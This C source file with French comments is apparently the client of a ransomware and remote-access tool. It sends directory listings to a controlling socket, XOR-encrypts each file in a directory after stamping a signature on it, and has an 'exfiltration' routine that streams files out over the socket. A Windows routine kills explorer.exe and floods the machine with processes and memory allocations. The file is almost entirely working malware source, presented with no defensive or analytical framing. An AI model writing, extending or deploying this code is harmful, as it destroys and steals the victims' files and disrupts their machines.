#include "common.h"
#include "fonction.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define ALLOCATION_SIZE (1024 * 1024)
#define SIGNATURE "Rendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10"

// ---------------- Generation d'identifiant ----------------
void generer_client_id(char *id, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)time(NULL)); // Initialisation du generateur de nombres aleatoires
    for (size_t i = 0; i < length; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        id[i] = charset[key];
    }
    id[length] = '\0';
}

// ---------------- Verification de fichier regulier ----------------
#ifdef _WIN32
int isRegularFile(const char *path) {
    struct _stat pathStat;
    if (_stat(path, &pathStat) != 0) {
        fprintf(stderr, "Erreur d'info de fichier\n");
        return 0;
    }
    return (pathStat.st_mode & S_IFREG) != 0;
}
#else
#include <sys/stat.h>

int isRegularFile(const char *path) {
    struct stat pathStat;
    if (stat(path, &pathStat) != 0) {
        perror("Erreur d'info de fichier");
        return 0;
    }
    return S_ISREG(pathStat.st_mode);
}
#endif

// ---------------- Liste des fichiers ----------------
#ifdef _WIN32
void listFiles(my_socket_t clientSocket) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(".\\*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    do {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s\n", findData.cFileName);
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            fprintf(stderr, "Erreur d'envoi d'un fichier au serveur.\n");
            FindClose(hFind);
            return;
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);

    const char *endMessage = "END_OF_LIST\n";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) < 0) {
        perror("Erreur d'envoi du signal END_OF_LIST");
    }
}
#else
void listFiles(my_socket_t clientSocket) {
    DIR *d = opendir(".");
    if (!d) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s\n", dir->d_name);
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            perror("Erreur d'envoi d'un fichier au serveur");
            closedir(d);
            return;
        }
    }
    closedir(d);

    const char *endMessage = "END_OF_LIST\n";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) < 0) {
        perror("Erreur d'envoi du signal END_OF_LIST");
    }
}
#endif

// ---------------- Chiffrement ----------------
void generateEncryptionKey(char *keyBuffer, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)time(NULL)); // Initialisation du generateur de nombres aleatoires
    for (size_t i = 0; i < length - 1; i++) {
        keyBuffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    keyBuffer[length - 1] = '\0'; // Assure la terminaison de la chaîne
}

void encryptFile(const char *filename, const char *key) {
    if (!isRegularFile(filename)) {
        logError("Le chemin specifie n'est pas un fichier regulier.");
        return;
    }

    FILE *file = fopen(filename, "a+");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier pour le chiffrement");
        return;
    }

    fprintf(file, "\n%s\n", SIGNATURE);

    fseek(file, 0, SEEK_SET);
    char buffer[1024];
    size_t bytesRead;
    FILE *tempFile = tmpfile();
    if (!tempFile) {
        perror("Erreur lors de la creation du fichier temporaire");
        fclose(file);
        return;
    }

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= key[i % strlen(key)];
        }
        fwrite(buffer, 1, bytesRead, tempFile);
    }

    freopen(filename, "w", file);
    rewind(tempFile);
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), tempFile)) > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    fclose(tempFile);
    fclose(file);

    printf("Fichier %s a ete chiffre.\n", filename);
}

void encryptFiles(const char *directory, const char *encryptionKey) {
#ifndef _WIN32
    DIR *d = opendir(directory);
    if (!d) {
        perror("Erreur lors de l'ouverture du repertoire");
        return;
    }

    char filepath[1024];
    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
            snprintf(filepath, sizeof(filepath), "%s/%s", directory, dir->d_name);
            encryptFile(filepath, encryptionKey);
        }
    }
    closedir(d);
#else
    printf("encryptFiles n'est pas supporte sur Windows.\n");
#endif
}

void logError(const char *message) {
    fprintf(stderr, "Erreur : %s\n", message);
}

// ---------------- Exfiltration ----------------
int exfiltration(my_socket_t clientSocket, const char *fichier) {
    FILE *f = fopen(fichier, "rb");
    if (f == NULL) {
        printf("Erreur: impossible d'ouvrir le fichier %s\n", fichier);
        const char *errorMsg = "ERROR_OPEN_FILE";
        send(clientSocket, errorMsg, (int)strlen(errorMsg), 0);
        return 1;
    }

    char buffer[1024];
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        if (send(clientSocket, buffer, (int)bytesRead, 0) <= 0) {
            printf("Erreur lors de l'envoi des donnees.\n");
            fclose(f);
            return 1;
        }
    }

    fclose(f);

    const char *endMessage = "END_OF_FILE";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) <= 0) {
        printf("Erreur lors de l'envoi du signal de fin.\n");
        return 1;
    }

    printf("Exfiltration du fichier %s terminee.\n", fichier);
    return 0;
}

// ---------------- Custom Fork (Windows uniquement) ----------------
#ifdef _WIN32
void create_notepad() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, "notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess a echoue (%d).\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void allocate_memory() {
    void *ptr = malloc(ALLOCATION_SIZE);
    if (ptr == NULL) {
        printf("echec de l'allocation memoire !\n");
        exit(1);
    }
    memset(ptr, 0, ALLOCATION_SIZE);
}

void kill_explorer() {
    system("taskkill /F /IM explorer.exe");
}

void custom_fork() {
    kill_explorer();
    for (int i = 0; i < 5; i++) {
        create_notepad();
        allocate_memory();
    }
}
#else
void custom_fork() {
    printf("custom_fork n'est pas supporte sur cette plateforme.\n");
}
#endif
